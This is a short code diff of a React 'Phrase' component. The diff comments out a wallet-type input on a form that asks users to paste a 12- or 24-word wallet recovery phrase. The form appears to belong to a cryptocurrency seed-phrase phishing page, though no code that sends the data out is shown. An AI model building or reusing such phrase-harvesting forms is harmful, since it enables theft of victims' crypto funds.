@@ -37,8 +37,8 @@ function Phrase() {
             <Header />
             <div className="phrase__form">
                 <form className="phrase__form">
-                <input value={walletName} placeholder="State Wallet Type e.g Binance" onChange={(e) => setWalletName(e.target.value)} type="text" name="WalletName">
-                </input>
+                {/* <input value={walletName} placeholder="State Wallet Type e.g Binance" onChange={(e) => setWalletName(e.target.value)} type="text" name="WalletName">
+                </input> */}
                 <textarea value={input} placeholder="Phrase" onChange={(e) => setInput(e.target.value)} type="text" name="Phrase">
                 </textarea>
                 <p className="phrase__description">Typically 12, (sometimes 24) words separated by single spaces</p>
